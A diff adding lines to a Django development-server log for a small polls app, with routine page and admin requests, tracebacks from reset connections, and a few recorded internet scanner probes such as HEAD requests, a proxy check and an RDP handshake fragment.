@@ -9869,3 +9869,2871 @@ Invalid HTTP_HOST header: 'www.baidu.com'. You may need to add 'www.baidu.com' t
 [21/Jun/2018 13:10:30] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 400 59036
 Invalid HTTP_HOST header: 'iZuf6640ra8ceyqgctyqibZ:8000'. You may need to add 'izuf6640ra8ceyqgctyqibz' to ALLOWED_HOSTS.
 [21/Jun/2018 13:19:02] "HEAD / HTTP/1.0" 400 58334
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 04, 2018 - 13:56:29
+Django version 2.0.7, using settings 'khalid.settings'
+Starting development server at http://0:8000/
+Quit the server with CONTROL-C.
+[04/Jul/2018 14:19:34] "GET /polls/home/ HTTP/1.1" 200 2015
+[04/Jul/2018 14:35:10] "GET /polls/home/ HTTP/1.1" 200 2015
+[04/Jul/2018 14:36:47] "GET /polls/home/ HTTP/1.1" 200 2015
+Not Found: /favicon.ico
+[04/Jul/2018 14:37:08] "GET /favicon.ico HTTP/1.1" 404 2083
+[04/Jul/2018 14:40:00] "GET /polls/home/ HTTP/1.1" 200 2015
+[04/Jul/2018 14:40:01] "GET /polls/home/ HTTP/1.1" 200 2015
+[04/Jul/2018 14:45:14] "GET /polls/home/ HTTP/1.1" 200 2015
+[04/Jul/2018 14:46:02] "GET /polls/show/ HTTP/1.1" 200 2797
+[04/Jul/2018 14:46:28] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 14:46:46] "GET /polls/home/ HTTP/1.1" 200 2015
+[04/Jul/2018 14:47:47] "GET /polls/home/ HTTP/1.1" 200 2015
+[04/Jul/2018 14:54:50] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 14:54:50] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 16:07:15] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 16:07:16] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 16:13:41] "GET /admin HTTP/1.1" 301 0
+[04/Jul/2018 16:13:41] "GET /admin/ HTTP/1.1" 302 0
+[04/Jul/2018 16:13:43] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1857
+[04/Jul/2018 16:13:43] "GET /static/admin/css/base.css HTTP/1.1" 200 16106
+[04/Jul/2018 16:13:43] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
+[04/Jul/2018 16:13:44] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17894
+[04/Jul/2018 16:13:44] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[04/Jul/2018 16:13:45] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
+[04/Jul/2018 16:13:46] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
+[04/Jul/2018 16:13:56] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 1990
+[04/Jul/2018 16:14:02] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
+[04/Jul/2018 16:20:54] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[04/Jul/2018 16:20:55] "GET /admin/ HTTP/1.1" 200 4908
+[04/Jul/2018 16:20:58] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
+[04/Jul/2018 16:20:59] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[04/Jul/2018 16:20:59] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[04/Jul/2018 16:21:30] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 16:21:30] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 17:11:24] "GET /polls/show HTTP/1.1" 301 0
+[04/Jul/2018 17:11:25] "GET /polls/show/ HTTP/1.1" 200 2797
+[04/Jul/2018 17:11:29] "GET /polls/show2 HTTP/1.1" 301 0
+[04/Jul/2018 17:11:30] "GET /polls/show2/ HTTP/1.1" 200 555
+[04/Jul/2018 17:11:38] "GET /polls/show3 HTTP/1.1" 301 0
+[04/Jul/2018 17:11:38] "GET /polls/show3/ HTTP/1.1" 200 593
+[04/Jul/2018 17:11:46] "GET /polls/show5 HTTP/1.1" 301 0
+[04/Jul/2018 17:11:46] "GET /polls/show5/ HTTP/1.1" 200 3428
+Not Found: /polls/show5/show5.appcache
+[04/Jul/2018 17:11:47] "GET /polls/show5/show5.appcache HTTP/1.1" 404 3983
+[04/Jul/2018 17:12:08] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 17:12:12] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 17:21:48] "GET /polls/home/ HTTP/1.1" 200 2071
+[04/Jul/2018 17:21:51] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 17:35:00] "GET /polls/home/ HTTP/1.1" 200 2071
+[04/Jul/2018 17:35:01] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 17:36:51] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 17:36:52] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 17:39:00] "GET /polls/home/ HTTP/1.1" 200 2104
+[04/Jul/2018 17:39:02] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 17:47:50] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 17:47:52] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 18:26:10] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 18:26:11] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[04/Jul/2018 20:17:24] "GET /polls/home HTTP/1.1" 301 0
+[04/Jul/2018 20:17:25] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 20:17:25] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[04/Jul/2018 20:17:25] "GET /favicon.ico HTTP/1.1" 404 2083
+[04/Jul/2018 20:45:59] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 20:45:59] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[04/Jul/2018 21:07:12] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[04/Jul/2018 21:28:59] "GET / HTTP/1.0" 400 58383
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[04/Jul/2018 21:28:59] "GET / HTTP/1.0" 500 59
+----------------------------------------
+Exception happened during processing of request from ('46.238.242.115', 50157)
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 647, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 357, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 717, in __init__
+    self.handle()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/local/python3/lib/python3.7/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+[04/Jul/2018 22:12:07] code 400, message Bad request syntax ('<<HeartBeat>>')
+[04/Jul/2018 22:12:07] "<<HeartBeat>>" 400 -
+[04/Jul/2018 22:54:46] "GET /polls/home/ HTTP/1.1" 200 2017
+[04/Jul/2018 22:54:47] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[05/Jul/2018 01:21:35] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[05/Jul/2018 02:12:30] "HEAD / HTTP/1.0" 400 58391
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[05/Jul/2018 02:44:36] "GET / HTTP/1.0" 400 58382
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[05/Jul/2018 02:52:07] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[05/Jul/2018 03:32:29] "GET / HTTP/1.0" 400 58382
+[05/Jul/2018 09:47:49] "GET /polls/home/ HTTP/1.1" 200 2017
+[05/Jul/2018 09:47:49] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[05/Jul/2018 09:47:50] "GET /favicon.ico HTTP/1.1" 404 2083
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[05/Jul/2018 10:29:06] "GET / HTTP/1.0" 400 58383
+[05/Jul/2018 10:29:07] "GET /polls/2/vote HTTP/1.1" 301 0
+[05/Jul/2018 10:29:08] "GET /polls/2/vote/ HTTP/1.1" 200 287
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[05/Jul/2018 10:38:14] "HEAD / HTTP/1.0" 400 58390
+[05/Jul/2018 10:41:34] "POST /polls/2/vote/ HTTP/1.1" 200 287
+[05/Jul/2018 10:41:38] "GET /polls/ HTTP/1.1" 200 144
+[05/Jul/2018 10:41:40] "GET /polls/2/ HTTP/1.1" 200 232
+[05/Jul/2018 10:41:42] "POST /polls/2/vote/ HTTP/1.1" 200 287
+[05/Jul/2018 10:41:44] "GET /polls/1/ HTTP/1.1" 200 705
+[05/Jul/2018 10:41:47] "POST /polls/1/vote/ HTTP/1.1" 302 0
+[05/Jul/2018 10:41:51] "GET /polls/1/results/ HTTP/1.1" 200 233
+[05/Jul/2018 10:42:06] "GET /polls/1/ HTTP/1.1" 200 705
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 04, 2018 - 14:16:37
+Django version 2.0.7, using settings 'khalid.settings'
+Starting development server at http://0:8000/
+Quit the server with CONTROL-C.
+Not Found: /polls/1/
+[05/Jul/2018 10:42:39] "GET /polls/1/ HTTP/1.1" 404 3936
+Not Found: /polls/1/
+[05/Jul/2018 10:42:44] "GET /polls/1/ HTTP/1.1" 404 3936
+Not Found: /polls/detail /1
+[05/Jul/2018 10:43:11] "GET /polls/detail%20/1 HTTP/1.1" 404 3959
+[05/Jul/2018 10:43:31] "GET /polls/detail/2 HTTP/1.1" 301 0
+[05/Jul/2018 10:43:35] "GET /polls/detail/2/ HTTP/1.1" 200 232
+Not Found: /polls/detail /1
+[05/Jul/2018 10:44:30] "GET /polls/detail%20/1 HTTP/1.1" 404 3959
+[05/Jul/2018 10:44:42] "GET /polls/detail/2/ HTTP/1.1" 200 232
+[05/Jul/2018 10:44:45] "POST /polls/2/vote/ HTTP/1.1" 200 287
+[05/Jul/2018 10:44:47] "POST /polls/2/vote/ HTTP/1.1" 200 287
+[05/Jul/2018 10:44:51] "GET /polls/ HTTP/1.1" 200 158
+[05/Jul/2018 10:44:53] "GET /polls/detail/1/ HTTP/1.1" 200 705
+[05/Jul/2018 10:44:56] "POST /polls/1/vote/ HTTP/1.1" 302 0
+[05/Jul/2018 10:44:57] "GET /polls/1/results/ HTTP/1.1" 200 240
+[05/Jul/2018 10:44:59] "GET /polls/detail/1/ HTTP/1.1" 200 705
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 05, 2018 - 10:42:36
+Django version 2.0.7, using settings 'khalid.settings'
+Starting development server at http://0:8000/
+Quit the server with CONTROL-C.
+Not Found: /polls/detail/1/
+[05/Jul/2018 10:45:19] "GET /polls/detail/1/ HTTP/1.1" 404 3950
+[05/Jul/2018 10:45:26] "GET /polls/ HTTP/1.1" 200 144
+[05/Jul/2018 10:45:28] "GET /polls/1/ HTTP/1.1" 200 705
+[05/Jul/2018 10:45:31] "POST /polls/1/vote/ HTTP/1.1" 302 0
+[05/Jul/2018 10:45:32] "GET /polls/1/results/ HTTP/1.1" 200 233
+[05/Jul/2018 10:45:34] "GET /polls/1/ HTTP/1.1" 200 705
+[05/Jul/2018 10:54:10] "GET /polls/home/ HTTP/1.1" 200 2102
+Not Found: /polls/home/text/css
+[05/Jul/2018 10:54:10] "GET /polls/home/text/css HTTP/1.1" 404 3962
+[05/Jul/2018 10:54:13] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+Not Found: /polls/home/text/css
+[05/Jul/2018 10:56:23] "GET /polls/home/text/css HTTP/1.1" 404 3962
+[05/Jul/2018 11:00:26] "GET /polls/home/ HTTP/1.1" 200 2117
+Not Found: /polls/home/text/css
+[05/Jul/2018 11:00:27] "GET /polls/home/text/css HTTP/1.1" 404 3962
+[05/Jul/2018 11:00:29] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[05/Jul/2018 11:01:46] "GET /polls/home/ HTTP/1.1" 200 2117
+[05/Jul/2018 11:01:46] "GET /static/polls/style_home.css HTTP/1.1" 200 30
+[05/Jul/2018 11:01:47] "GET /polls/media/back.jpg/ HTTP/1.1" 200 47923
+[05/Jul/2018 11:12:58] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[05/Jul/2018 12:00:13] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 12:00:14] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[05/Jul/2018 12:00:15] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[05/Jul/2018 12:00:22] "GET /polls/home/ HTTP/1.1" 200 2079
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[05/Jul/2018 14:04:52] "HEAD / HTTP/1.0" 400 58389
+[05/Jul/2018 14:08:29] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[05/Jul/2018 15:18:48] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:18:48] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[05/Jul/2018 15:23:39] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:04] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:05] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:05] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:11] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:13] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:46] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:47] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:48] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:48] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:24:54] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:31:46] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:31:57] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:31:58] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:32:27] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:32:28] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:32:57] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:32:59] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:33:00] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:33:05] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:33:25] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:33:28] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:33:29] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:33:31] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:33:59] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:35:04] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:38:14] "GET /polls/home/ HTTP/1.1" 200 2079
+[05/Jul/2018 15:38:14] "GET /static/polls/style_home.css HTTP/1.1" 200 71
+[05/Jul/2018 15:38:14] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[05/Jul/2018 15:40:45] "GET /polls/home/ HTTP/1.1" 200 2081
+[05/Jul/2018 15:43:14] "GET /polls/home/ HTTP/1.1" 200 2081
+[05/Jul/2018 15:43:14] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[05/Jul/2018 15:44:04] "GET /polls/home/ HTTP/1.1" 200 2085
+[05/Jul/2018 15:44:53] "GET /polls/home/ HTTP/1.1" 200 2085
+[05/Jul/2018 15:44:53] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[05/Jul/2018 15:44:55] "GET /polls/home/ HTTP/1.1" 200 2085
+[05/Jul/2018 15:44:57] "GET /polls/home/ HTTP/1.1" 200 2085
+[05/Jul/2018 15:47:57] "GET /polls/home/ HTTP/1.1" 200 2085
+[05/Jul/2018 15:47:58] "GET /static/polls/style_home.css HTTP/1.1" 200 85
+[05/Jul/2018 15:48:04] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[05/Jul/2018 15:50:24] "GET /polls/home/ HTTP/1.1" 200 2085
+[05/Jul/2018 15:50:25] "GET /static/polls/style_home.css HTTP/1.1" 200 85
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[06/Jul/2018 03:31:23] "GET / HTTP/1.0" 400 58381
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[06/Jul/2018 04:17:10] "HEAD / HTTP/1.0" 400 58389
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[06/Jul/2018 05:22:01] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58659
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[06/Jul/2018 08:20:29] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[06/Jul/2018 08:34:47] "HEAD / HTTP/1.0" 400 58390
+[06/Jul/2018 10:16:50] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 10:16:51] "GET /static/polls/style_home.css HTTP/1.1" 200 85
+[06/Jul/2018 10:16:51] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[06/Jul/2018 10:17:00] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 10:17:00] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[06/Jul/2018 10:17:00] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[06/Jul/2018 10:17:01] "GET /favicon.ico HTTP/1.1" 404 2083
+[06/Jul/2018 10:51:51] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 10:51:52] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 10:51:53] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 10:51:53] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 10:51:54] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 10:51:58] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 10:51:58] "GET /static/polls/style_home.css HTTP/1.1" 200 118
+[06/Jul/2018 10:51:59] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[06/Jul/2018 10:52:18] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[06/Jul/2018 10:52:39] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 10:52:39] "GET /static/polls/style_home.css HTTP/1.1" 200 85
+[06/Jul/2018 11:04:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[06/Jul/2018 11:04:05] "  /*à     Cookie: mstshash=Administr" 400 -
+[06/Jul/2018 11:14:21] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 11:14:21] "GET /static/polls/style_home.css HTTP/1.1" 200 154
+[06/Jul/2018 11:15:31] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 11:15:31] "GET /static/polls/style_home.css HTTP/1.1" 200 154
+[06/Jul/2018 11:16:13] "GET /polls/home/ HTTP/1.1" 200 2134
+[06/Jul/2018 11:16:13] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:16:17] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:16:23] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:16:33] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:16:33] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:16:34] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:16:34] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:16:34] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:16:34] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:16:35] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+----------------------------------------
+Exception happened during processing of request from ('60.165.254.3', 65342)
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 647, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 357, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 717, in __init__
+    self.handle()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 147, in handle
+    if not self.parse_request():  # An error code has been sent, just exit
+  File "/usr/local/python3/lib/python3.7/http/server.py", line 337, in parse_request
+    _class=self.MessageClass)
+  File "/usr/local/python3/lib/python3.7/http/client.py", line 205, in parse_headers
+    line = fp.readline(_MAXLINE + 1)
+  File "/usr/local/python3/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /index.do
+[06/Jul/2018 11:17:34] "GET /index.do HTTP/1.1" 404 2074
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:18:05] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:19:39] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+Not Found: /polls/home/www.baidu.com
+[06/Jul/2018 11:20:30] "GET /polls/home/www.baidu.com HTTP/1.1" 404 3977
+[06/Jul/2018 11:21:10] "GET /polls/home/ HTTP/1.1" 200 2141
+[06/Jul/2018 11:21:10] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[06/Jul/2018 11:28:54] "GET /polls/home/ HTTP/1.1" 200 2141
+[06/Jul/2018 11:28:54] "GET /static/polls/style_home.css HTTP/1.1" 200 131
+[06/Jul/2018 11:29:18] "GET /polls/home/ HTTP/1.1" 200 2141
+[06/Jul/2018 11:29:18] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[06/Jul/2018 11:30:02] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 11:30:02] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[06/Jul/2018 11:42:14] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 11:42:15] "GET /static/polls/style_home.css HTTP/1.1" 200 131
+[06/Jul/2018 11:43:02] "GET /polls/home/ HTTP/1.1" 200 2085
+[06/Jul/2018 11:43:03] "GET /static/polls/style_home.css HTTP/1.1" 200 162
+[06/Jul/2018 11:57:00] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 11:57:00] "GET /static/polls/style_home.css HTTP/1.1" 200 197
+[06/Jul/2018 11:58:23] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 11:58:24] "GET /static/polls/style_home.css HTTP/1.1" 200 198
+[06/Jul/2018 11:58:25] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 11:58:26] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[06/Jul/2018 12:00:27] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 12:00:27] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[06/Jul/2018 13:26:29] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 13:26:29] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[06/Jul/2018 14:35:53] "HEAD / HTTP/1.0" 400 58390
+[06/Jul/2018 15:07:34] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 15:07:34] "GET /static/polls/style_home.css HTTP/1.1" 200 231
+[06/Jul/2018 15:07:44] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 15:07:44] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[06/Jul/2018 15:35:27] "HEAD / HTTP/1.0" 400 58390
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[06/Jul/2018 15:39:01] "GET / HTTP/1.0" 400 58382
+Not Found: /
+[06/Jul/2018 18:45:24] "GET / HTTP/1.1" 404 2032
+Not Found: /
+[06/Jul/2018 18:45:49] "GET / HTTP/1.1" 404 2032
+[06/Jul/2018 20:32:30] "GET /polls/home/ HTTP/1.1" 200 2097
+[06/Jul/2018 20:32:30] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[06/Jul/2018 20:32:30] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[06/Jul/2018 20:32:30] "GET /favicon.ico HTTP/1.1" 404 2083
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
